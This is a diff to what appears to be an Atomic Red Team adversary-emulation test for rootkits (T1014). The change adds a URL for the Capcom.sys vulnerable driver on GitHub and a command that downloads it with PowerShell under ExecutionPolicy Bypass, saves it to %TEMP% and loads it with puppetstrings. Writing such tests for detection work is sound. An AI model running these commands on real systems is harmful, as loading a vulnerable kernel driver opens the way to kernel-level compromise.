@@ -53,12 +53,17 @@ atomic_tests:
     - windows
 
   input_arguments:
+    capcom_uri:
+      description: Capcom.sys driver URI
+      type: Url
+      default: https://github.com/FuzzySecurity/Capcom-Rootkit/raw/master/Driver/Capcom.sys
     driver_path:
       description: Path to the vulnerable driver
       type: Path
-      default: C:\Drivers\driver.sys
+      default: %TEMP%\driver.sys
       
   executor:
     name: command_prompt
     command: |
-      puppetstrings #{driver_path}
+      echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -Uri #{capcom_uri} -OutFile #{driver_path} | powershell -ExecutionPolicy Bypass -Command -
+      C:\AtomicRedTeam\atomics\T1014\bin\puppetstrings #{driver_path}
